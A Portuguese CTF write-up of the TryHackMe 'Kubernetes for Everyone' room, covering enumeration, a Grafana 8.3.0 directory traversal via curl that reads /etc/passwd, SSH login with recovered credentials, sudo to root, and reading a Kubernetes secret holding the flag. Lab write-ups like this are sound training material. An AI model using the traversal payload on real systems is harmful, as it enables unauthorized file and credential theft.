# CTF-Kubernetes4Everyone-THM-WriteUp

**DIficuldade:** Média

<h3> Eai, tudo beleza ? Terminei um curso focado em Kubernetes e nada melhor pra um hacker do que conhecer as coisas por outra perspectiva...</h3>

A maquina da vez se chama [Kubernetes-for-Everyone](https://tryhackme.com/room/kubernetesforyouly) focada em kubernetes, helm, kube cluster.

## Enumeração Inicial

`sudo nmap -sV -sC -T4 10.10.82.233`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp  open  rpcbind 2-4 (RPC #100000)
3000/tcp open  ppp?
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.12)
|_http-title: Etch a Sketch
6443/tcp open  ssl/sun-sr-https?
|     Content-Type: application/json
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}

```

> Essa porta 6443 trouxe algo diferente né ?

### Verificando porta 3000

`gobuster dir -u http://10.10.82.233:3000 --exclude-length 28034 -t 100 -r -x php,txt,html -w dir-med.txt 2>/dev/null`

```
/signup               (Status: 200) [Size: 27985]
/verify               (Status: 200) [Size: 27985]
/apidocs              (Status: 401) [Size: 32]   
/apidocs.php          (Status: 401) [Size: 32]
```

### http://10.10.82.233:3000
![image](https://user-images.githubusercontent.com/32500664/171016081-b0538e15-872e-41a0-908f-691d741d4cf6.png)
> A pagina do login mostra que a versão é 8.3.0.

### Procurando aquela lembrancinha pra galera do SOC conseguimos achar um [directory transversal attack](https://www.exploit-db.com/exploits/50581)
![image](https://user-images.githubusercontent.com/32500664/171017237-eb880424-92b3-4d4b-a5e6-85ea38d40e62.png)
>Dando uma lida no exploit basicamente o payload enviado é
`url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read`
>O exploit tambem lista todos os plugins. Um dos primeiros é o AlertList, decido então usar o path até ele para ler arquivos interessantes.
### Importante usar a opção –path-as-is se não a request não vai funcionar
`curl http://10.10.82.233:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd --path-as-is`
>output
```
...
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:<Senha>:/home/grafana:/sbin/nologin

```
### Temos um possivel senha, mas e o usuário ?

#Porta 5000
![image](https://user-images.githubusercontent.com/32500664/171029201-7863e741-b74b-48f5-9db1-306e7bdb4c4c.png)

No source algo interessante no arquivo main.css.
![image](https://user-images.githubusercontent.com/32500664/171029492-b87e057f-a536-4d0a-8c87-14aa1507944a.png)]

>Conteudo dá url Pastebin
>"OZQWO4TBNZ2A===="
`echo "OZQWO4TBNZ2A====" | base32 -d`
Output:
>vagrant
Uma possivel senha ou usuário ?

# Acesso a maquina.
Usando o usuário do senha do arquivo passwd e o possivel usuário do main.css...
```
ssh Usuário@10.10.35.154 

Usuário@10.10.35.154's password: ***************

Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


248 packages can be updated.
192 updates are security updates.


Last login: Thu Feb 10 18:58:49 2022 from 10.0.2.2
vagrant@Sant:~$
```

Usando `sudo -l` descobrimos que podemos executar qualquer comando como sudo.
>Um simples `sudo su` e temos root

# Procurando as flags

Um root simples demais e a flag aparentemente dificil... Nada no /home e no /root.

>Usando o comando top recebemos...
```
   35 root      20   0       0      0      0 S 20.4  0.0   6:56.84 kswapd0                                                                                             
 1824 kube-ap+  20   0  766848  17428   1276 S 16.1  3.5   1:13.15 kube-controller                                                                                     
 1490 root      20   0  739920  10680    968 S 10.9  2.2   1:25.75 containerd                                                                                          
 1177 472       20   0  786592  13112   4812 S  9.2  2.7   2:33.98 grafana-server                                                                                      
 1298 vagrant   20   0   29820   4716    372 R  6.3  1.0   7:19.36 python3                                                                                             
 1413 root      20   0  787356  21628   1848 S  6.0  4.4   2:05.88 k0s                                                                                                 
```
Percebemos que estamos em uma distro k0s

Como a própria pergunta diz...
`k0s kubectl get secret`

```
NAME                  TYPE                                  DATA   AGE
default-token-nhwb5   kubernetes.io/service-account-token   3      85d
k8s.authentication    Opaque                                1      85d
```
`k0s kubectl edit secret k8s.authentication`
```
# Please edit the object below. Lines beginning with a '#' will be ignored,
# and an empty file will abort the edit. If an error occurs while saving this file will be
# reopened with the relevant failures.
#
apiVersion: v1
data:
  id: VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9
kind: Secret
metadata:
  creationTimestamp: "2022-02-10T18:58:02Z"
  name: k8s.authentication
  namespace: default
  resourceVersion: "515"
  uid: 416e4783-03a8-4f92-8e91-8cbc491bf727
type: Opaque
```
### O ID é meio suspeito...
`echo "VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9" | base64 -d`
`THM{***_*_*_****__*_*_}`
